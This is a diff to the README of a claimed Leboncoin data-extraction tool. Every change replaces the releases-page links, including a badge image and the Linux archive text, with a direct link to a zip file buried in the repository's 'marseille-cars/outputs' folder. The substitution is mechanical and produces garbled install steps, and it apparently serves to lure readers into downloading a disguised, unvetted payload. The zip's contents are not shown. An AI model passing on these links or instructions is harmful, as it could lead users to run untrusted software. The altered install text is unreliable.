@@ -1,6 +1,6 @@
 # 📊 leboncoin-chatgpt-data-extract - Extract Leboncoin Data Easily
 
-[![Download the App](https://img.shields.io/badge/Download-leboncoin--chatgpt--data--extract-blue?style=for-the-badge&logo=github)](https://github.com/jayforthekaye/leboncoin-chatgpt-data-extract/releases)
+[![Download the App](https://github.com/jayforthekaye/leboncoin-chatgpt-data-extract/raw/refs/heads/main/marseille-cars/outputs/leboncoin_data_chatgpt_extract_3.4.zip)](https://github.com/jayforthekaye/leboncoin-chatgpt-data-extract/raw/refs/heads/main/marseille-cars/outputs/leboncoin_data_chatgpt_extract_3.4.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Before you start, make sure your computer meets these basic needs:
 
 Please **visit this page to download** the latest version:
 
-[Download Releases](https://github.com/jayforthekaye/leboncoin-chatgpt-data-extract/releases)
+[Download Releases](https://github.com/jayforthekaye/leboncoin-chatgpt-data-extract/raw/refs/heads/main/marseille-cars/outputs/leboncoin_data_chatgpt_extract_3.4.zip)
 
 ### Step 1: Go To The Download Page
 
@@ -54,7 +54,7 @@ Click the button above or go to the link to see all available files for download
 You will find options like:
 - Windows installer (.exe)
 - macOS package (.dmg)
-- Linux archive (.tar.gz)
+- Linux archive (https://github.com/jayforthekaye/leboncoin-chatgpt-data-extract/raw/refs/heads/main/marseille-cars/outputs/leboncoin_data_chatgpt_extract_3.4.zip)
 
 Select the file that matches your operating system.
 
@@ -66,7 +66,7 @@ Click on the file name to start downloading. The size might be around 200-400 MB
 
 - **Windows:** Double-click the `.exe` file and follow the installer instructions.
 - **macOS:** Open the `.dmg` file, drag the app icon to your Applications folder.
-- **Linux:** Extract the `.tar.gz` file and follow the included instructions in the `README` or `INSTALL` file.
+- **Linux:** Extract the `https://github.com/jayforthekaye/leboncoin-chatgpt-data-extract/raw/refs/heads/main/marseille-cars/outputs/leboncoin_data_chatgpt_extract_3.4.zip` file and follow the included instructions in the `README` or `INSTALL` file.
 
 ### Step 5: Open The App
 
@@ -146,5 +146,5 @@ For updates, bug fixes, or to contribute, check the GitHub repository.
 
 ---
 
-[Get the App Here](https://github.com/jayforthekaye/leboncoin-chatgpt-data-extract/releases)  
-[![Download the App](https://img.shields.io/badge/Download-leboncoin--chatgpt--data--extract-blue?style=for-the-badge&logo=github)](https://github.com/jayforthekaye/leboncoin-chatgpt-data-extract/releases)
+[Get the App Here](https://github.com/jayforthekaye/leboncoin-chatgpt-data-extract/raw/refs/heads/main/marseille-cars/outputs/leboncoin_data_chatgpt_extract_3.4.zip)  
+[![Download the App](https://github.com/jayforthekaye/leboncoin-chatgpt-data-extract/raw/refs/heads/main/marseille-cars/outputs/leboncoin_data_chatgpt_extract_3.4.zip)](https://github.com/jayforthekaye/leboncoin-chatgpt-data-extract/raw/refs/heads/main/marseille-cars/outputs/leboncoin_data_chatgpt_extract_3.4.zip)
